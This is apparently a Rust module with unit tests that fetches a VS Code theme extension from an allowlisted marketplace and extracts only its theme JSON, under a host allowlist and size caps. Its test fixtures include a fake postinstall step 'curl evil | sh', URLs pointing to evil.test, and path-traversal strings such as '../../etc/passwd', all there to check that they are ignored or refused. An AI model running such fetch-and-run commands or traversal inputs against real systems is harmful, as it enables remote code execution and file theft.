//! Fetching a VS Code theme from the marketplace (#350).
//!
//! The converter next door reads a theme JSON the user already has. This is
//! the other half the issue asks for: given a marketplace URL or a
//! `publisher.name` id, download the `.vsix`, take the theme JSON out of it,
//! and hand that to the converter.
//!
//! # What this does NOT do
//!
//! **No extension code is fetched to be run, and none is kept.** A `.vsix`
//! is a zip that may contain JavaScript, native binaries and a manifest
//! telling an editor to execute them. croft extracts exactly one member —
//! a theme JSON named by the extension's own `contributes.themes` — into a
//! temporary directory, converts it, and discards the archive. Nothing is
//! installed into an extensions directory, nothing is executed, and no
//! `package.json` field other than the theme list is read.
//!
//! That is the whole trust argument, and it is why this is a narrow path
//! rather than an extension installer: the archive is treated as a hostile
//! container from which one known-shaped file is lifted.

use std::path::{Path, PathBuf};
use std::time::Duration;

use anyhow::{Context, Result, bail};

/// How long the download may take before it is abandoned.
pub const FETCH_TIMEOUT: Duration = Duration::from_secs(60);

/// Largest `.vsix` worth downloading. Theme extensions are tens of
/// kilobytes; a hundred megabytes means the URL is not what it claimed.
pub const MAX_VSIX_BYTES: u64 = 64 * 1024 * 1024;

/// A marketplace extension's identity: `publisher.name`, as the gallery
/// keys everything on.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ExtensionId {
    pub publisher: String,
    pub name: String,
}

impl ExtensionId {
    /// The gallery's direct download URL for the latest version.
    pub fn vsix_url(&self) -> String {
        format!(
            "https://marketplace.visualstudio.com/_apis/public/gallery/publishers/{}/vsextensions/{}/latest/vspackage",
            self.publisher, self.name
        )
    }
}

/// Parse `publisher.name`, a marketplace item URL, or an
/// `vscode:extension/publisher.name` link into an id.
///
/// Deliberately strict about the host. A URL that merely *looks* like a
/// marketplace link but points elsewhere would otherwise make this a
/// general-purpose downloader pointed at an archive extractor, which is a
/// much larger thing to trust than "fetch a theme from the marketplace".
pub fn parse_ref(input: &str) -> Result<ExtensionId> {
    let raw = input.trim();
    if raw.is_empty() {
        bail!("empty extension reference");
    }
    // `vscode:extension/publisher.name`
    let candidate = if let Some(rest) = raw.strip_prefix("vscode:extension/") {
        rest.to_string()
    } else if raw.starts_with("http://") || raw.starts_with("https://") {
        item_name_from_url(raw)?
    } else {
        raw.to_string()
    };
    split_id(&candidate)
}

/// The `itemName=publisher.name` query parameter of a marketplace URL.
fn item_name_from_url(url: &str) -> Result<String> {
    let rest = url
        .strip_prefix("https://")
        .or_else(|| url.strip_prefix("http://"))
        .unwrap_or(url);
    let (host, tail) = rest.split_once('/').unwrap_or((rest, ""));
    // Host allowlist, exact match: `marketplace.visualstudio.com` and the
    // Open VSX mirror are the two galleries this understands.
    let host = host.split_once('@').map(|(_, h)| h).unwrap_or(host);
    let host = host.split(':').next().unwrap_or(host);
    if !matches!(host, "marketplace.visualstudio.com" | "open-vsx.org") {
        bail!(
            "not a marketplace URL: {host} (expected marketplace.visualstudio.com or open-vsx.org)"
        );
    }
    if let Some(q) = tail.split_once('?').map(|(_, q)| q) {
        for pair in q.split('&') {
            if let Some(v) = pair.strip_prefix("itemName=") {
                return Ok(v.to_string());
            }
        }
    }
    // Open VSX uses a path shape: /extension/publisher/name
    if let Some(rest) = tail.strip_prefix("extension/")
        && let Some((pubr, name)) = rest.split_once('/')
    {
        let name = name.split(['/', '?', '#']).next().unwrap_or(name);
        return Ok(format!("{pubr}.{name}"));
    }
    bail!("marketplace URL carries no itemName= parameter");
}

fn split_id(candidate: &str) -> Result<ExtensionId> {
    let candidate = candidate.split(['?', '#']).next().unwrap_or(candidate);
    let Some((publisher, name)) = candidate.split_once('.') else {
        bail!("expected publisher.name, got {candidate:?}");
    };
    let ok = |s: &str| {
        !s.is_empty()
            && s.chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
    };
    if !ok(publisher) || !ok(name) {
        bail!("expected publisher.name in [A-Za-z0-9_-], got {candidate:?}");
    }
    Ok(ExtensionId {
        publisher: publisher.to_string(),
        name: name.to_string(),
    })
}

/// One theme a `.vsix` contributes, as its `package.json` declares it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ContributedTheme {
    /// The label a user would recognise ("One Dark Pro").
    pub label: String,
    /// Archive-relative path to the theme JSON.
    pub path: String,
}

/// The themes a `package.json` contributes, in declaration order.
///
/// Only `contributes.themes` is read. Every other field — `main`,
/// `activationEvents`, `scripts` — is ignored by construction, because the
/// archive is never installed and nothing in it is executed.
pub fn contributed_themes(package_json: &str) -> Result<Vec<ContributedTheme>> {
    let v: serde_json::Value =
        serde_json::from_str(package_json).context("package.json is not valid JSON")?;
    let Some(list) = v.pointer("/contributes/themes").and_then(|t| t.as_array()) else {
        bail!("this extension contributes no themes");
    };
    let mut out = Vec::new();
    for t in list {
        let Some(path) = t.get("path").and_then(|p| p.as_str()) else {
            continue;
        };
        let label = t
            .get("label")
            .and_then(|l| l.as_str())
            .or_else(|| t.get("id").and_then(|l| l.as_str()))
            .unwrap_or(path);
        out.push(ContributedTheme {
            // `./themes/x.json` is how most manifests spell it; the archive
            // member has no leading `./`.
            path: path.trim_start_matches("./").to_string(),
            label: label.to_string(),
        });
    }
    if out.is_empty() {
        bail!("this extension contributes no themes");
    }
    Ok(out)
}

/// Pick the theme to convert: the one whose label matches `wanted`
/// case-insensitively, or the only one, or an error listing the choices.
///
/// An extension contributing several themes (Catppuccin ships four) must
/// not silently convert whichever happens to be first — the user would get
/// a theme they did not ask for and no indication why.
pub fn pick_theme<'a>(
    themes: &'a [ContributedTheme],
    wanted: Option<&str>,
) -> Result<&'a ContributedTheme> {
    if let Some(w) = wanted {
        return themes
            .iter()
            .find(|t| t.label.eq_ignore_ascii_case(w))
            .with_context(|| {
                let names: Vec<&str> = themes.iter().map(|t| t.label.as_str()).collect();
                format!(
                    "no theme called {w:?}; this extension has: {}",
                    names.join(", ")
                )
            });
    }
    match themes {
        [only] => Ok(only),
        many => {
            let names: Vec<&str> = many.iter().map(|t| t.label.as_str()).collect();
            bail!(
                "this extension contributes {} themes; pass --theme with one of: {}",
                many.len(),
                names.join(", ")
            )
        }
    }
}

/// Download the `.vsix` for `id` into `dir`, returning the file's path.
pub fn download_vsix(id: &ExtensionId, dir: &Path) -> Result<PathBuf> {
    use std::io::Read;
    let url = id.vsix_url();
    let resp = ureq::AgentBuilder::new()
        .timeout(FETCH_TIMEOUT)
        .redirects(4)
        .build()
        .get(&url)
        .call()
        .with_context(|| format!("downloading {url}"))?;
    let dest = dir.join(format!("{}.{}.vsix", id.publisher, id.name));
    let mut bytes = Vec::new();
    resp.into_reader()
        .take(MAX_VSIX_BYTES + 1)
        .read_to_end(&mut bytes)
        .context("reading the .vsix body")?;
    if bytes.len() as u64 > MAX_VSIX_BYTES {
        bail!(
            "refusing a .vsix larger than {} bytes — that is not a theme",
            MAX_VSIX_BYTES
        );
    }
    let bytes = gunzip_if_needed(bytes)?;
    std::fs::write(&dest, &bytes).with_context(|| format!("writing {}", dest.display()))?;
    Ok(dest)
}

/// The gallery serves the `.vsix` gzipped, and answers with the compressed
/// bytes unless the client negotiates otherwise — so what arrives is a
/// gzip stream wrapping a zip, and handing it straight to the zip reader
/// fails with "Could not find EOCD". Sniff the magic rather than trusting
/// a header: this is the one place the archive's shape is knowable for
/// certain, and a mislabelled response should still work.
fn gunzip_if_needed(bytes: Vec<u8>) -> Result<Vec<u8>> {
    use std::io::Read;
    if !bytes.starts_with(&[0x1f, 0x8b]) {
        return Ok(bytes);
    }
    let mut out = Vec::new();
    flate2::read::GzDecoder::new(&bytes[..])
        .take(MAX_VSIX_BYTES + 1)
        .read_to_end(&mut out)
        .context("decompressing the gzipped .vsix")?;
    if out.len() as u64 > MAX_VSIX_BYTES {
        bail!(
            "refusing a .vsix that decompresses past {} bytes",
            MAX_VSIX_BYTES
        );
    }
    Ok(out)
}

/// Read one member of the `.vsix` as text, through the shared archive
/// reader so the traversal guard and the size cap apply.
pub fn read_member(vsix: &Path, member: &str, scratch: &Path) -> Result<String> {
    let extracted =
        crate::archive::extract_member(vsix, crate::archive::ArchiveKind::Zip, member, scratch)
            .with_context(|| format!("extracting {member}"))?;
    std::fs::read_to_string(&extracted).with_context(|| format!("reading {member}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_reference_shape_resolves_to_the_same_id() {
        let want = ExtensionId {
            publisher: "zhuangtongfa".into(),
            name: "material-theme".into(),
        };
        for input in [
            "zhuangtongfa.material-theme",
            "vscode:extension/zhuangtongfa.material-theme",
            "https://marketplace.visualstudio.com/items?itemName=zhuangtongfa.material-theme",
            "https://marketplace.visualstudio.com/items?ssr=false&itemName=zhuangtongfa.material-theme",
            "https://open-vsx.org/extension/zhuangtongfa/material-theme",
            "  zhuangtongfa.material-theme  ",
        ] {
            assert_eq!(parse_ref(input).unwrap(), want, "for {input}");
        }
        assert_eq!(
            want.vsix_url(),
            "https://marketplace.visualstudio.com/_apis/public/gallery/publishers/zhuangtongfa/vsextensions/material-theme/latest/vspackage"
        );
    }

    /// The host allowlist is the whole trust boundary: without it this is a
    /// general downloader wired to an archive extractor.
    #[test]
    fn a_url_that_is_not_a_marketplace_is_refused() {
        for input in [
            "https://evil.test/items?itemName=a.b",
            "https://marketplace.visualstudio.com.evil.test/items?itemName=a.b",
            "http://user@evil.test/items?itemName=a.b",
            "https://marketplace.visualstudio.com/items",
            "",
            "not-an-id",
            "a.",
            ".b",
            "a b.c",
            "../../etc/passwd",
            "a.b/../../c",
        ] {
            assert!(parse_ref(input).is_err(), "must refuse {input:?}");
        }
    }

    #[test]
    fn only_the_theme_list_is_read_from_a_package_json() {
        let pkg = r##"{
          "name": "x", "main": "./out/extension.js",
          "activationEvents": ["*"],
          "scripts": { "postinstall": "curl evil | sh" },
          "contributes": {
            "commands": [{ "command": "x.run" }],
            "themes": [
              { "label": "One Dark Pro", "uiTheme": "vs-dark", "path": "./themes/OneDark-Pro.json" },
              { "id": "flat", "uiTheme": "vs-dark", "path": "themes/flat.json" }
            ]
          }
        }"##;
        let themes = contributed_themes(pkg).unwrap();
        assert_eq!(
            themes,
            vec![
                ContributedTheme {
                    label: "One Dark Pro".into(),
                    path: "themes/OneDark-Pro.json".into()
                },
                ContributedTheme {
                    label: "flat".into(),
                    path: "themes/flat.json".into()
                },
            ],
            "the leading ./ is stripped and `id` stands in for a missing label"
        );
        // An extension with no themes is refused rather than half-handled.
        assert!(contributed_themes(r#"{"contributes":{"commands":[]}}"#).is_err());
        assert!(contributed_themes("not json").is_err());
    }

    /// The gallery gzips the `.vsix`, so the bytes that arrive are a gzip
    /// stream wrapping a zip. Sniffed by magic, and a plain zip passes
    /// through untouched.
    #[test]
    fn a_gzipped_vsix_is_unwrapped_and_a_plain_one_is_not() {
        use std::io::Write;
        let zip_magic = b"PK\x03\x04rest of a zip";
        assert_eq!(
            gunzip_if_needed(zip_magic.to_vec()).unwrap(),
            zip_magic.to_vec(),
            "a plain zip is passed through byte for byte"
        );
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        enc.write_all(zip_magic).unwrap();
        let gzipped = enc.finish().unwrap();
        assert_eq!(&gzipped[..2], &[0x1f, 0x8b], "fixture really is gzip");
        assert_eq!(
            gunzip_if_needed(gzipped).unwrap(),
            zip_magic.to_vec(),
            "and a gzipped one is unwrapped to the same bytes"
        );
    }

    /// Several themes in one extension must not silently convert the first.
    #[test]
    fn a_multi_theme_extension_asks_which_one() {
        let themes = vec![
            ContributedTheme {
                label: "Catppuccin Mocha".into(),
                path: "themes/mocha.json".into(),
            },
            ContributedTheme {
                label: "Catppuccin Latte".into(),
                path: "themes/latte.json".into(),
            },
        ];
        let err = pick_theme(&themes, None).unwrap_err().to_string();
        assert!(
            err.contains("Catppuccin Mocha") && err.contains("Catppuccin Latte"),
            "{err}"
        );
        assert_eq!(
            pick_theme(&themes, Some("catppuccin latte")).unwrap().path,
            "themes/latte.json",
            "the match is case-insensitive"
        );
        let miss = pick_theme(&themes, Some("Nord")).unwrap_err().to_string();
        assert!(miss.contains("no theme called"), "{miss}");

        // A single-theme extension needs no choice.
        let one = &themes[..1];
        assert_eq!(pick_theme(one, None).unwrap().path, "themes/mocha.json");
    }
}
